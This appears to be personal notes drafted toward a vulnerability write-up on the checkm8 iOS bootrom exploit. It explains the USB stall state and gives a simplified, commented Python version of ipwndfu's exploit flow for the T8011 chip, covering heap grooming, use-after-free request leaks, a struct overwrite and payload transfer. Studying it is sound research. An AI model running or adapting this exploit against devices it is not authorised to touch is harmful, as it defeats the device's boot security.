# Notes

## Used to jot stuff down before I write the vulnerability write-up

### Stalled state
'Stalling' the device is not the same as a USB stall that is defined in the USB specification.

When the device is stalled in checkm8, I believe it is a state where it is 'stalled' because the host has not told it what to do. As a result, it stops operation because it has no idea how to operate without the host telling it what to do.

In ipwndfu, the device is stalled using `libusb1_async_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 'A' * 0xC0, 0.00001`. The use of the very short timeout indicates that one is trying to cancel the request mid-way through the transfer. The bmRequestType of 0x80 indicates a device to host transfer. The wValue of 0x304 indicates the following: the wValueHigh value of 0x3 defines the type of descriptor to fetch (USB_DT_STRING) and the wValueLow value of 0x4 provides the index of the string descriptor (which will be the USB serial number here).

Simplified version of ipwndfu checkm8 for T8011
```python
# Initial setup of exploit
device = dfu.acquire_device()
start = time.time()
print(f'Found: {device.serial_number}')
if 'PWND:[' in device.serial_number:
    print('Device is already in pwned DFU Mode. Not executing exploit.')
    return
# Load device config and payload
payload, config = exploit_config(device.serial_number)

# Heap feng-shui

# Puts device into stalled state
stall(device)
for i in range(6):
    no_leak(device) # Don't leak zlp
usb_req_leak(device) # Leak usb request
no_leak(device) # Don't leak zlp

dfu.usb_reset(device)
dfu.release_device(device)

# Allocation and freeing of IO buffer without clearing global state
device = dfu.acquire_device()
device.serial_number
# Short timeout to cancel request mid-way through transfer
libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, 'A' * 0x800, 0.0001)
# bRequest of 4 is DFU_CLRSTATUS
libusb1_no_error_ctrl_transfer(device, 0x21, 4, 0, 0, 0, 0)
dfu.release_device(device)

time.sleep(0.5)

device = dfu.acquire_device()

# These requests cause allocation to be in the hole created at heap feng-shui stage
usb_req_stall(device) # Stall usb request
usb_req_leak(device) # Leak usb request
# Overwrite the usb_device_io_request struct and USB descriptor objects in memory
libusb1_no_error_ctrl_transfer(device, 0, 0, 0, 0, config.overwrite, 100)
for i in range(0, len(payload), 0x800):
    # Transfer payload
    libusb1_no_error_ctrl_transfer(device, 0x21, 1, 0, 0, payload[i:i+0x800], 100)
dfu.usb_reset(device) # Reset to trigger image parsing
dfu.release_device(device)

device = dfu.acquire_device()
if 'PWND:[checkm8]' not in device.serial_number:
    print('ERROR: Exploit failed. Device did not enter pwned DFU Mode.')
    sys.exit(1)
print('Device is now in pwned DFU Mode.')
print('(%0.2f seconds)' % (time.time() - start))
dfu.release_device(device)
```